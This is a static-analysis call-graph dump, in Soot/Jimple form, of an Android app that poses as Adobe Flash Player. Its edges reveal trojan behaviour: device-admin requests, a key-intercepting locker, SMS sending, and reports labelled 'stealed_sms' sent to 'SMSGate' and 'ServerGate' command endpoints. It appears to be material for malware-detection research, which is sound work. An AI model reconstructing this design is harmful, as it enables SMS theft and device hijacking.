VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeZCore: android.content.ComponentName startService(android.content.Intent)>($r1) in <com.adobe.flashplayer_.AdobeZCore: void onDestroy()> ==> <android.content.ContextWrapper: android.content.ComponentName startService(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(byte[],java.lang.String)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r3.<com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>($r0) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(java.lang.String)>("android.app.action.ADD_DEVICE_ADMIN") in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>(r2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r13) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" [ End ] ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosATmp", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("#", "W") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r8) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: java.lang.Object getSystemService(java.lang.String)>("phone") in <com.adobe.packages.ZLocker: void <init>()> ==> <android.app.Activity: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<com.adobe.packages.ZLocker: boolean onKeyDown(int,android.view.KeyEvent)>(0, null) in <dummyMainClass: com.adobe.packages.ZLocker dummyMainMethod_com_adobe_packages_ZLocker(android.content.Intent)> ==> <com.adobe.packages.ZLocker: boolean onKeyDown(int,android.view.KeyEvent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r14, $r6, $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r14.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r12) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>($r15) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("callBlock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r5) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Throwable: void <init>()>() in <java.lang.Exception: void <init>()> ==> <java.lang.Throwable: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("a_link", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent setFlags(int)>(268435456) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent setFlags(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.View findViewById(int)>(2131296256) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <android.app.Activity: android.view.View findViewById(int)>
STATIC edge: $r11 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer.Certificate: android.view.Window getWindow()>() in <com.adobe.flashplayer.Certificate: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
STATIC edge: r4 = staticinvoke <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>($l2) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String millisToDate(long)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r20, "out", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void saveData(java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r10.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("Reich_SMSGate", r1) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.adobeCore: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("warn", r1, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r21 = virtualinvoke $r19.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <com.adobe.flashplayer_.ADOBEcoreZa: void onDisabled(android.content.Context,android.content.Intent)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r16) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.AsyncTask: void <init>()>() in <com.adobe.flashplayer_.FlashVirtual: void <init>()> ==> <android.os.AsyncTask: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_sms&i=sms") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r10 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.adobeCore: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r21, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r37 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: virtualinvoke $r2.<android.content.Intent: android.content.Intent addFlags(int)>(67108864) in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: android.content.Intent addFlags(int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Integer: int parseInt(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("keyHttpGate[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r15 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(long)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":SMSGATE") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
